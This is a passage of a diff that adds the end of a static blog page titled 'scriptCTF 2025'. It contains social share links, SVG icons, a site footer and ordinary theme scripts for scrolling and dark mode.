+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f&amp;title=scriptCTF%202025&amp;summary=scriptCTF%202025&amp;source=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on reddit"
+            href="https://reddit.com/submit?url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f&title=scriptCTF%202025">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on whatsapp"
+            href="https://api.whatsapp.com/send?text=scriptCTF%202025%20-%20https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on telegram"
+            href="https://telegram.me/share/url?text=scriptCTF%202025&amp;url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=scriptCTF%202025&u=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://albovo.github.io/en/">Portfolio</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
